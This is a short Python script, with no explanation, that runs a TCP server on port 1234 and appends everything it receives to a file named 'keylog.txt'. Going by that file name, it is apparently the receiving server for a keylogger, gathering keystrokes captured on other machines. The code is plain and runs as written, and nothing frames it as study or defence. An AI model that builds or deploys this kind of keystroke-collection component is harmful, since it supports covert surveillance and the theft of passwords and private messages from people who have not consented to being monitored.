import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1234))
s.listen(5)
while True:
    clientsocket, address = s.accept()
    resp = clientsocket.recv(1024)
    resp = resp.decode("utf-8")
    file = open("keylog.txt", "a")
    file.write(str(resp))
    file.close()